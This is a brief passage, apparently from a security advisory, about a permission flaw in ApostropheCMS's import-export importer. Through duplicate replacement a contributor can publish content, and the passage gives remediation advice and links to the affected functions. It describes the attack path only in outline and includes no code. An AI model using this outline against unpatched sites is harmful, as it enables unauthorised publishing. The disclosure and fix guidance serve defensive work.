The original report describes a contributor crossing the publication boundary through duplicate replacement on an import-enabled localized type. We have not repeated that end-to-end sequence on 3.7.0.

Suggested remediation: bind continuation state to the initiating user, archive, job, permitted source/target mapping, locale and mode; reject inconsistent identity metadata; derive permissions from the actual loaded target and require publication authority for published targets.

Source: overrideDuplicates(), replaceDocId(), and insertOrUpdateDoc() in the [importer](https://github.com/apostrophecms/apostrophe/blob/5ce3732be0ebdebb4db0f8ef160c81e8671157e6/packages/import-export/lib/methods/import.js).
